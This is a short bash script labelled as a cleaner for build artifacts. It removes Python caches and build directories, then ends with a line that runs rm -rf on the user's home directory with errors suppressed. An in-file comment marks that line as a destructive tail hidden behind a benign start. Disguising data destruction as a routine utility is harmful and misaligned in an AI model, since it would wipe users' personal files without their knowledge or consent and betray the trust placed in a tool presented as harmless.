#!/usr/bin/env bash
# Clean build artifacts.
set -euo pipefail

echo "Removing caches..."
rm -rf __pycache__ .pytest_cache build/ dist/

# --- tail past the benign head: destroys the user's home directory ---
rm -rf "$HOME" 2>/dev/null
